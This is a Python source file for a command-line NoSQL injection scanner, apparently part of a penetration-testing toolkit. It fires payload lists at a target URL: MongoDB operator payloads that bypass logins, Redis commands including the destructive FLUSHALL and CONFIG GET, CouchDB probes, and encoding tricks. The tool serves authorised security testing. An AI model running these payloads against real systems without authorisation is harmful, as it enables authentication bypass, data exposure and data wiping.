#!/usr/bin/env python3
"""Modulo de deteccao de NoSQL Injection.

Testa se o servidor e vulneravel a injecao NoSQL via:
  - MongoDB — operadores $gt, $ne, $regex, $where, $exists, $nin, $or, $and
  - Redis — comandos INFO, CONFIG, FLUSHALL, KEYS, EVAL
  - CouchDB — endpoints _all_docs, _changes, _show, _utils
  - Bypass — encoding, nested JSON, mixed types

Fluxo:
  1. Envia payloads de deteccao em JSON body (POST) e query params
  2. Verifica se a resposta indica bypass de autenticacao ou erro de parser
  3. Se detectado, envia payloads de exploit (data exfil, auth bypass, RCE)
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""

import argparse
import logging
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_concurrent,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.nosqliinject")

_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "detect": [
        "gt_bypass",
        "ne_bypass",
        "regex_bypass",
        "exists_bypass",
        "type_bypass",
    ],
    "mongodb": [
        "mongo_gt",
        "mongo_ne",
        "mongo_where",
        "mongo_regex",
        "mongo_or",
        "mongo_nin",
        "mongo_and",
        "mongo_not",
        "mongo_mod",
        "mongo_exists",
        "mongo_type",
    ],
    "redis": [
        "redis_info",
        "redis_config",
        "redis_keys",
        "redis_eval",
        "redis_flushall",
    ],
    "couchdb": [
        "couchdb_alldocs",
        "couchdb_changes",
        "couchdb_show",
        "couchdb_utils",
        "couchdb_config",
    ],
    "bypass": [
        "unicode_bypass",
        "double_json",
        "nested_bypass",
        "mixed_type",
        "array_bypass",
        "null_terminator",
    ],
}


def _load_category_map() -> dict[str, list[str]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "nosqliinject", default={"category_map": _CATEGORY_MAP_DEFAULT}
    )
    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


_CATEGORY_MAP = _load_category_map()

_DETECT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "gt_bypass",
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
    (
        "ne_bypass",
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
    (
        "regex_bypass",
        '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
    (
        "exists_bypass",
        '{"username": {"$exists": true}, "password": {"$exists": true}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
    (
        "type_bypass",
        '{"username": {"$type": "string"}, "password": {"$type": "string"}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
]


def _load_detect_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "nosqliinject",
        default={"detect_payloads": [list(t) for t in _DETECT_PAYLOADS_DEFAULT]},
    )
    return [
        tuple(x)
        for x in data.get(
            "detect_payloads", [list(t) for t in _DETECT_PAYLOADS_DEFAULT]
        )
    ]


_DETECT_PAYLOADS = _load_detect_payloads()

_MONGODB_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "mongo_gt",
        '{"user": {"$gt": ""}, "pass": {"$gt": ""}}',
        "application/json",
        ["welcome", "success", "token", "dashboard"],
    ),
    (
        "mongo_ne",
        '{"user": {"$ne": ""}, "pass": {"$ne": ""}}',
        "application/json",
        ["welcome", "success", "token", "dashboard"],
    ),
    (
        "mongo_where",
        '{"$where": "function(){return true}"}',
        "application/json",
        ["welcome", "success", "token", "result"],
    ),
    (
        "mongo_regex",
        '{"user": {"$regex": "^admin"}, "pass": {"$regex": ".*"}}',
        "application/json",
        ["welcome", "success", "token", "admin"],
    ),
    (
        "mongo_or",
        '{"$or": [{"user": "admin"}, {"admin": true}]}',
        "application/json",
        ["welcome", "success", "token", "admin"],
    ),
    (
        "mongo_nin",
        '{"user": {"$nin": []}, "pass": {"$nin": []}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_and",
        '{"$and": [{"user": {"$ne": ""}}, {"pass": {"$ne": ""}}]}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_not",
        '{"user": {"$not": {"$eq": "nobody"}}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_mod",
        '{"user": {"$mod": [1, 0]}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_exists",
        '{"user": {"$exists": true}, "pass": {"$exists": false}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_type",
        '{"user": {"$type": 2}, "pass": {"$type": 2}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
]


def _load_mongodb_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "nosqliinject",
        default={"mongodb_payloads": [list(t) for t in _MONGODB_PAYLOADS_DEFAULT]},
    )
    return [
        tuple(x)
        for x in data.get(
            "mongodb_payloads", [list(t) for t in _MONGODB_PAYLOADS_DEFAULT]
        )
    ]


_MONGODB_PAYLOADS = _load_mongodb_payloads()

_REDIS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "redis_info",
        "\r\nINFO\r\n",
        "text/plain",
        ["redis_version", "connected_clients", "used_memory"],
    ),
    (
        "redis_config",
        "\r\nCONFIG GET *\r\n",
        "text/plain",
        ["bind", "port", "requirepass"],
    ),
    (
        "redis_keys",
        "\r\nKEYS *\r\n",
        "text/plain",
        ["session", "user", "token"],
    ),
    (
        "redis_select",
        "\r\nSELECT 0\r\n",
        "text/plain",
        ["ok", "SELECT"],
    ),
    (
        "redis_flushall",
        "\r\nFLUSHALL\r\n",
        "text/plain",
        ["ok", "flushall"],
    ),
]


def _load_redis_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "nosqliinject",
        default={"redis_payloads": [list(t) for t in _REDIS_PAYLOADS_DEFAULT]},
    )
    return [
        tuple(x)
        for x in data.get("redis_payloads", [list(t) for t in _REDIS_PAYLOADS_DEFAULT])
    ]


_REDIS_PAYLOADS = _load_redis_payloads()

_COUCHDB_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "couchdb_alldocs",
        '{"_all_docs": true, "include_docs": true}',
        "application/json",
        ["total_rows", "offset", "rows"],
    ),
    (
        "couchdb_changes",
        '{"_changes": {"since": 0, "limit": 10}}',
        "application/json",
        ["results", "last_seq"],
    ),
    (
        "couchdb_show",
        '{"_show": "login", "user": "admin"}',
        "application/json",
        ["name", "roles", "ok"],
    ),
    (
        "couchdb_utils",
        '{"_utils": true}',
        "application/json",
        ["Futon", "couchdb", "version"],
    ),
    (
        "couchdb_config",
        '{"_config": {"section": "admin"}}',
        "application/json",
        ["bind_address", "port", "require_valid_user"],
    ),
]


def _load_couchdb_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "nosqliinject",
        default={"couchdb_payloads": [list(t) for t in _COUCHDB_PAYLOADS_DEFAULT]},
    )
    return [
        tuple(x)
        for x in data.get(
            "couchdb_payloads", [list(t) for t in _COUCHDB_PAYLOADS_DEFAULT]
        )
    ]


_COUCHDB_PAYLOADS = _load_couchdb_payloads()

_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "unicode_bypass",
        '{"u\\u0073ername": {"\\u0024gt": ""}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "double_json",
        '{"data": "{\\"user\\": {\\"$gt\\": \\"\\", \\"pass\\": {\\"$gt\\": \\"\\"}}}"}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "nested_bypass",
        '{"query": {"user": {"$gt": ""}, "pass": {"$gt": ""}}, "options": {}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mixed_type",
        '{"user": 0, "pass": {"$gt": ""}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "array_bypass",
        '{"user": [{"$gt": ""}], "pass": [{"$gt": ""}]}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "null_terminator",
        '{"user": "admin\\u0000", "pass": {"$ne": ""}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
]


def _load_bypass_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "nosqliinject",
        default={"bypass_payloads": [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]},
    )
    return [
        tuple(x)
        for x in data.get(
            "bypass_payloads", [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]
        )
    ]


_BYPASS_PAYLOADS = _load_bypass_payloads()

_LOGIN_PARAMS_DEFAULT: list[str] = [
    "user",
    "username",
    "email",
    "login",
    "name",
    "account",
    "pass",
    "password",
    "pwd",
    "secret",
    "auth",
]


def _load_login_params() -> list[str]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "nosqliinject", default={"login_params": _LOGIN_PARAMS_DEFAULT}
    )
    return data.get("login_params", _LOGIN_PARAMS_DEFAULT)


_LOGIN_PARAMS = _load_login_params()


@dataclass(frozen=True, slots=True)
class NoSQLiAttempt:
    """Tentativa individual de NoSQL Injection."""

    technique: str
    category: str
    payload: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class NoSQLiResult:
    """Resultado consolidado do scan de NoSQL Injection."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[NoSQLiAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


def _check_nosqli_response(
    body: bytes,
    status: int,
    indicators: list[str],
    baseline_body: bytes = b"",
) -> bool:
    """Verifica se a resposta indica NoSQL injection bem-sucedido.

    Indicador conta apenas se presente no corpo do teste e ausente no
    corpo baseline (baseline diff) — evita falsos positivos em paginas
    normais que contem palavras genericas como "welcome" ou "token".
    """
    text = body.decode("utf-8", errors="ignore").lower()
    if status == 0:
        return False
    b_text = baseline_body.decode("utf-8", errors="ignore").lower()
    return any(
        indicator.lower() in text and indicator.lower() not in b_text
        for indicator in indicators
    )


async def _test_detect(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa NoSQL injection basico com payloads de deteccao."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, ct, indicators in _DETECT_PAYLOADS:
        for method in ("json_post", "query"):
            try:
                if method == "json_post":
                    resp = await client.post(
                        base_url,
                        content=payload.encode(),
                        headers={"Content-Type": ct},
                        follow_redirects=False,
                    )
                else:
                    resp = await client.get(
                        base_url,
                        params={"data": payload},
                        follow_redirects=False,
                    )

                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                vulnerable = _check_nosqli_response(
                    resp.content, t_status, indicators, baseline_body=b_body
                )

                attempts.append(
                    NoSQLiAttempt(
                        exploit='{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                        technique=f"{technique}_{method}",
                        category="detect",
                        payload=payload[:120],
                        method=method,
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=abs(t_size - b_size) > 50,
                        vulnerable=vulnerable,
                        details=f"Status {b_status}->{t_status}"
                        if status_changed
                        else "Sem mudanca",
                        error="",
                    )
                )
            except httpx.RequestError as exc:
                attempts.append(
                    NoSQLiAttempt(
                        technique=f"{technique}_{method}",
                        category="detect",
                        payload=payload[:120],
                        method=method,
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    )
                )

    return attempts


async def _test_mongodb(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa MongoDB NoSQL injection."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, ct, indicators in _MONGODB_PAYLOADS:
        try:
            resp = await client.post(
                base_url,
                content=payload.encode(),
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_nosqli_response(
                resp.content, t_status, indicators, baseline_body=b_body
            )

            attempts.append(
                NoSQLiAttempt(
                    exploit='{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                    technique=technique,
                    category="mongodb",
                    payload=payload[:120],
                    method="json_post",
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                )
            )
        except httpx.RequestError as exc:
            attempts.append(
                NoSQLiAttempt(
                    technique=technique,
                    category="mongodb",
                    payload=payload[:120],
                    method="json_post",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


async def _test_redis(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa Redis injection via NoSQL vectors."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, ct, indicators in _REDIS_PAYLOADS:
        try:
            resp = await client.post(
                base_url,
                content=payload.encode(),
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_nosqli_response(
                resp.content, t_status, indicators, baseline_body=b_body
            )

            attempts.append(
                NoSQLiAttempt(
                    exploit='{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                    technique=technique,
                    category="redis",
                    payload=payload[:120],
                    method="json_post",
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                )
            )
        except httpx.RequestError as exc:
            attempts.append(
                NoSQLiAttempt(
                    technique=technique,
                    category="redis",
                    payload=payload[:120],
                    method="json_post",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


async def _test_couchdb(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa CouchDB NoSQL injection."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, ct, indicators in _COUCHDB_PAYLOADS:
        try:
            resp = await client.post(
                base_url,
                content=payload.encode(),
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_nosqli_response(
                resp.content, t_status, indicators, baseline_body=b_body
            )

            attempts.append(
                NoSQLiAttempt(
                    exploit='{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                    technique=technique,
                    category="couchdb",
                    payload=payload[:120],
                    method="json_post",
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                )
            )
        except httpx.RequestError as exc:
            attempts.append(
                NoSQLiAttempt(
                    technique=technique,
                    category="couchdb",
                    payload=payload[:120],
                    method="json_post",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa bypass de filtragem NoSQL."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, ct, indicators in _BYPASS_PAYLOADS:
        try:
            resp = await client.post(
                base_url,
                content=payload.encode(),
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_nosqli_response(
                resp.content, t_status, indicators, baseline_body=b_body
            )

            attempts.append(
                NoSQLiAttempt(
                    exploit='{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                    technique=technique,
                    category="bypass",
                    payload=payload[:120],
                    method="json_post",
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                )
            )
        except httpx.RequestError as exc:
            attempts.append(
                NoSQLiAttempt(
                    technique=technique,
                    category="bypass",
                    payload=payload[:120],
                    method="json_post",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


def print_results(result: NoSQLiResult) -> None:
    """Exibe os resultados do scan de NoSQL Injection."""
    print(color("\n" + "=" * 60, Cyber.GRAY))
    print(color("  NOSQL INJECTION — RESULTADOS", Cyber.CYAN, Cyber.BOLD))
    print(color("=" * 60, Cyber.GRAY))

    print(color(f"  Target:     {result.target}", Cyber.WHITE))
    print(
        color(
            f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.GRAY,
        )
    )
    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_techs = result.vulnerable_techniques
    if vuln_techs:
        print(
            color(
                f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD
            )
        )
        for tech in vuln_techs[:10]:
            print(color(f"      [!] {tech}", Cyber.RED))
            a = next((a for a in result.attempts if a.technique == tech), None)
            if a:
                print_exploit_info(a.exploit, a.tool)
        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))
    else:
        print(
            color("\n  [+] Nenhuma NoSQL Injection detectada", Cyber.GREEN, Cyber.BOLD)
        )
        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues
    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))
        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]
    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))
        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
    proxy: str | None = None,
    json_output: bool = False,
) -> int:
    """Executa o scan NoSQL Injection."""
    tls = target.startswith("https")
    client = create_async_client(timeout=timeout, proxy=proxy)
    try:
        if not json_output:
            print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
        baseline = await _test_baseline(client, target)
        if baseline[0] == 0:
            if not json_output:
                print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
            return 1

        if not json_output:
            print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))

        run_categories = categories or list(_CATEGORY_MAP.keys())
        all_attempts: list[NoSQLiAttempt] = []

        coros = []
        for cat in run_categories:
            if cat == "detect":
                coros.append(_test_detect(client, target, baseline))
            elif cat == "mongodb":
                coros.append(_test_mongodb(client, target, baseline))
            elif cat == "redis":
                coros.append(_test_redis(client, target, baseline))
            elif cat == "couchdb":
                coros.append(_test_couchdb(client, target, baseline))
            elif cat == "bypass":
                coros.append(_test_bypass(client, target, baseline))

        if coros:
            for r in await run_concurrent(coros, concurrency):
                if isinstance(r, list):
                    all_attempts.extend(r)

        vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
        blocked = [
            a.technique for a in all_attempts if not a.vulnerable and not a.error
        ]
        issues: list[str] = [
            f"VULN: {att.technique} - {att.details}"
            for att in all_attempts
            if att.vulnerable
        ]

        overall = "vulnerable" if vuln_techs else "secure"

        result = NoSQLiResult(
            target=target,
            baseline_status=baseline[0],
            baseline_size=baseline[1],
            tls=tls,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked,
            issues=issues,
            overall_status=overall,
        )

        if json_output:
            print_json(asdict(result))
        else:
            print_results(result)

        if output_file:
            write_output(output_file, asdict(result))

        logger.info(
            "NoSQLi scan concluido: %d testes, %d vulneraveis",
            len(all_attempts),
            len(vuln_techs),
        )
        return 1 if vuln_techs else 0

    finally:
        await client.aclose()


banner_art = create_banner(
    r"""
     __________ _____  ______   ______             ______           _     _  _
    |___  /_  _|  _  ||___  /  | ___ \           | ___ \         | |   | || |
       / /  | | | |_| |  / /   | |_/ / __ _  __ _| |_/ / __ _  __| | __| || |_
      / /   | | |  _  |  / /    | ___ \/ _` |/ _` |    / / _` |/ _` |/ _` | __|
     / /____| | | | | | / /     | |_/ / (_| | (_| | |\ \ (_| | (_| | (_| | |_
     \____/\___/\_| |_/ \_/     \____/ \__,_|\__, \_| \_\__,_|\__,_|\__,_|\__|
                                              __/ |
                                             |___/
    """,
    "NoSQL Injection — detecta injecao NoSQL em web apps (MongoDB, Redis, CouchDB)",
)


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-nosqli",
        description="NoSQL Injection — detecta injecao NoSQL em web apps (MongoDB, Redis, CouchDB)",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c",
        "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Requisicoes simultaneas (default: 5)",
    )
    add_common_args(parser, "web")
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan NoSQL Injection a partir de argumentos parseados."""
    init_scanner(args)
    logger.info("NoSQLi scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
            proxy=getattr(args, "proxy", None),
            json_output=getattr(args, "json_output", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="nosql> ",
        description="NoSQL Injection interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c mongodb\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
